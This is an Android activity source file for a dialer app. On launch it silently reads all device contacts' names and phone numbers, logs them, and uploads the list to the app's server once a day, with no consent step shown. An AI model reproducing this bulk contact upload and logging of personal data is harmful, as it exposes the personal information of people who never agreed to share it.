package com.kabaladigital.tingtingu.ui.activity;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.kabaladigital.tingtingu.Class.Global;
import com.kabaladigital.tingtingu.R;
import com.kabaladigital.tingtingu.database.AppDatabase;
import com.kabaladigital.tingtingu.database.DataRepository;
import com.kabaladigital.tingtingu.databinding.ActivityMainBinding;
import com.kabaladigital.tingtingu.models.ContactUploadModel;
import com.kabaladigital.tingtingu.networking.ApiClient;
import com.kabaladigital.tingtingu.networking.ApiInterface;
import com.kabaladigital.tingtingu.service.MyBroadCastReceiver;
import com.kabaladigital.tingtingu.util.DateUtility;
import com.kabaladigital.tingtingu.util.Installation;
import com.kabaladigital.tingtingu.util.PreferenceUtils;
import com.kabaladigital.tingtingu.util.Utilities;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static com.google.firebase.crashlytics.internal.Logger.TAG;

public class MainActivity extends AppCompatActivity {

    private static final String TAG_CHANGELOG_DIALOG = "changelog";
    String jsonStr;
    JsonArray jsonArrayContact = new JsonArray();
    // Intent
    Intent mIntent;
    String mIntentAction;
    String mIntentType;

    ActivityMainBinding binding;
    public static final String MESSAGE_STATUS = "MainActivity";
    DataRepository repository;

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this,R.layout.activity_main);

        Installation.id(this);
        setSupportActionBar(binding.toolbarMainActivity);
        Global.TTULibraryImage(this) ;
        Global.TTULibraryVideo(this) ;
        Global.TTULibraryProfile(this) ;


        PreferenceUtils.getInstance(this,true); // Get the preferences
        Utilities.setUpLocale(this);

        repository = DataRepository
                .getInstance(AppDatabase.getDatabase(this));
        if (!DateUtility.getDateFormatted().equals(repository.getTodayDayFromPlayOrder())){
            repository.updateTodayDateCount();
        }

        FirebaseMessaging.getInstance().getToken()
                .addOnCompleteListener(new OnCompleteListener<String>() {
                    @Override
                    public void onComplete(@NonNull Task<String> task) {
                        if (!task.isSuccessful()) {
                            Log.w("Firebase_token", "Fetching FCM registration token failed", task.getException());
                            return;
                        }
                        String token = task.getResult();
                        JSONObject jsonObject=new JSONObject();
                        try {

                            jsonObject.put("token",token);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                        JsonParser jsonParser = new JsonParser();
                        JsonObject gsonObject = (JsonObject)jsonParser.parse(jsonObject.toString());

                        updateToken(gsonObject);
                        Log.d("Firebase_token", token);
                    }
                });

        String _ctime = new SimpleDateFormat("yyyyMMdd").format(new Date());
        String _DBtime=   PreferenceUtils.getInstance().getString(R.string.pref_c_upload_date);
        if(_ctime.equalsIgnoreCase(_DBtime)==false) {
            new Thread(new Runnable() {
                public void run() {
                    ReadContactDetailsJson();
                }
            }).start();
        }
        //Notification
//        ShowNotificationAd.createNotification(this);
//        ShowNotificationAd.createImageWithCallNotification(this);
//        ShowNotificationAd.createImageWithoutCallNotification(this);
//        ShowNotificationAd.createImageWithURLNotification(this);
//        ShowNotificationAd.createVideoWithURLNotification(this);

        // Check if first instance
        boolean isFirstInstance = PreferenceUtils.getInstance().getBoolean(R.string.pref_is_first_instance_key);
        if (!isFirstInstance) checkVersion();


        // Check whether this app was set as the default dialer
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            //Do something for android Q  and above versions
            Utilities.checkDefaultDialer(this);
        }
        else{
            //do something below Q android 7,8,9
            Utilities.checkDefaultDialer_2(this);
        }



        // Check for intents from others apps
        checkIncomingIntent();

        // Create Network constraint
//        Constraints constraints = new Constraints.Builder()
//                .setRequiredNetworkType(NetworkType.CONNECTED)
//                .build();

//        PeriodicWorkRequest.Builder myWorkBuilder =
//                new PeriodicWorkRequest.Builder(GetAdData.class, 15, TimeUnit.MINUTES);
//
//        PeriodicWorkRequest myWork = myWorkBuilder.build();
//        WorkManager mWorkManager = WorkManager.getInstance(getApplicationContext());
//        mWorkManager.enqueueUniquePeriodicWork("Sync", ExistingPeriodicWorkPolicy.KEEP
//                ,myWork);

//        WorkManager manualWorkManager = WorkManager.getInstance(getApplicationContext());
//        manualWorkManager.enqueue(OneTimeWorkRequest.from(GetAdData.class));


//
//        PeriodicWorkRequest periodicSyncDataWork =
//                new PeriodicWorkRequest.Builder(GetAdData.class, 15, TimeUnit.MINUTES)
//                        .addTag("TAG_SYNC_DATA")
//                        .setConstraints(constraints)
//                        // setting a backoff on case the work needs to retry
//                        .setBackoffCriteria(BackoffPolicy.LINEAR, PeriodicWorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
//                        .build();
//
//        WorkManager mWorkManager = WorkManager.getInstance(getApplicationContext());
//
//        mWorkManager.enqueueUniquePeriodicWork(
//                "SYNC_DATA_WORK_NAME",
//                ExistingPeriodicWorkPolicy.KEEP, //Existing Periodic Work policy
//                periodicSyncDataWork //work request
//        );

//        WorkManager mWorkManager = WorkManager.getInstance(getApplicationContext());
//
//        PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(GetAdData.class
//                , 15, TimeUnit.MINUTES).build();
//
//        mWorkManager.getWorkInfoByIdLiveData(workRequest.getId()).observe(this, new Observer<WorkInfo>() {
//            @Override
//            public void onChanged(@Nullable WorkInfo workInfo) {
//                if (workInfo != null) {
//                    WorkInfo.State state = workInfo.getState();
//                    Log.i("SyncChnage", state.toString() + "\n");
//                }
//            }
//        });
//
//        mWorkManager.enqueue(workRequest);

        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        Intent intent = new Intent(this, MyBroadCastReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this,0,intent,0);
        alarmManager.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP
                , SystemClock.elapsedRealtime()
                , 15*60*1000
                , pendingIntent);
    }

    private void uploadContact(JsonObject contactListObj){
        ApiInterface apiInterface = ApiClient.createService(ApiInterface.class);
        Call<ContactUploadModel> call = apiInterface.contactUploadDetails(contactListObj);
        // retrofit2.Call<ContactUploadModel> call = apiInterface.contactUploadDetails(contactListObj);
        call.enqueue(new Callback<ContactUploadModel>() {
            @Override
            public void onResponse(Call<ContactUploadModel> call,
                                   Response<ContactUploadModel> response) {
                if (response.code() == 200) {
                    Toast.makeText(getApplicationContext(),"Success",Toast.LENGTH_SHORT).show();
                    String timeStamp = new SimpleDateFormat("yyyyMMdd").format(new Date());
                   PreferenceUtils.getInstance().putString(R.string.pref_c_upload_date,timeStamp);
                }
            }
            @Override
            public void onFailure(Call<ContactUploadModel> call, Throwable t) {
                Toast.makeText(getApplicationContext(), "onFailure= "+t.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }



    private void ReadContactDetailsJson() {

        ContentResolver cr = getApplicationContext().getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {

                JsonObject contactobj = new JsonObject();
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    String phoneNo = "";
                    while (pCur.moveToNext()) {
                        phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Log.i(TAG, "Name: " + name);
                        Log.i(TAG, "Phone Number: " + phoneNo);
                    }

                    contactobj.addProperty("name", name);
                    String lastFourDigits = "";     //substring containing last 4 characters

                    if (phoneNo.length() > 10)
                    {
                        lastFourDigits = phoneNo.substring(phoneNo.length() - 10);
                    }
                    else
                    {
                        lastFourDigits = phoneNo;
                    }
                    contactobj.addProperty("number",  lastFourDigits);
                    pCur.close();
                }

                jsonArrayContact.add(contactobj);

            }
        }
        if (cur != null) {
            cur.close();
        }

        JsonObject  contactListObj = new JsonObject();
        contactListObj.add("contactList", jsonArrayContact);
       // jsonStr = contactListObj.toString();

        uploadContact(contactListObj);
    }
    @Override
    public boolean onSupportNavigateUp() {
        onBackPressed();
        return true;
    }

    /**
     * Check for the app version
     */
    private void checkVersion() {
//        int lastVersionCode = PreferenceUtils.getInstance().getInt(R.string.pref_last_version_key);
//        if (lastVersionCode < BuildConfig.VERSION_CODE) {
//            PreferenceUtils.getInstance().putInt(R.string.pref_last_version_key, BuildConfig.VERSION_CODE);

            //Hide Change Log Dialog
//            new ChangelogDialog().show(getSupportFragmentManager(), TAG_CHANGELOG_DIALOG);
//        }
    }

    // -- Utilities -- //
    private void checkPermissions(@Nullable int[] grantResults) {
        if ((grantResults != null && Utilities.checkPermissionsGranted(grantResults)) ||
                        Utilities.checkPermissionsGranted(this, Utilities.MUST_HAVE_PERMISSIONS)) { //If granted
            checkVersion();
        } else {
            Utilities.askForPermissions(MainActivity.this, Utilities.MUST_HAVE_PERMISSIONS);

            /*final Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    // Do something after 5s = 5000ms
                    Utilities.askForPermissions(MainActivity.this, Utilities.MUST_HAVE_PERMISSIONS);
                }
            }, 5000);*/

        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == Utilities.DEFAULT_DIALER_RC) {
            checkPermissions(null);
        }
    }

    /**
     * Checking for incoming intents from other applications
     */
    private void checkIncomingIntent() {
        mIntent = getIntent();
        mIntentAction = mIntent.getAction();
        mIntentType = mIntent.getType();

        if (Intent.ACTION_VIEW.equals(mIntentAction)) {
            handleViewIntent(mIntent);
        }
    }

    /**
     * Handle a VIEW intent (For example when you click a number in whatsapp)
     *
     * @param intent
     */
    private void handleViewIntent(Intent intent) {
        String sharedText = intent.getData().toString();
        String number = "";
        if (sharedText.contains("tel:")) {
            number = sharedText.substring(4, sharedText.length() - 1);

            //TODO Check Intent Working
            if (number != null) {
//                mSharedDialViewModel.setNumber(number);
//                mBottomSheetBehavior.setState(BottomSheetBehavior.STATE_EXPANDED);
            }
        }
    }

    protected String getSaltString() {
        String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 6) { // length of the random string.
            int index = (int) (rnd.nextFloat() * SALTCHARS.length());
            salt.append(SALTCHARS.charAt(index));
        }
        String saltStr = salt.toString();
        return saltStr;

    }


    private void updateToken(JsonObject token)    {
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("token", token.toString())
                .build();

//        jsonObject.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
        ApiClient.createService(ApiInterface.class).updateTokenAccess(token).enqueue(new Callback<JsonObject>() {
            @Override
            public void onResponse(Call<JsonObject> call, Response<JsonObject> response) {
                if (response.code()==200){
                    Log.i("Success", "Response: " + response.code());


                }
                if (response.code()==500){
                    Log.i("Error", "Response: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<JsonObject> call, Throwable t) {
                Log.i("Failed", "Error: " + t.getMessage());
            }
        });
    }


}
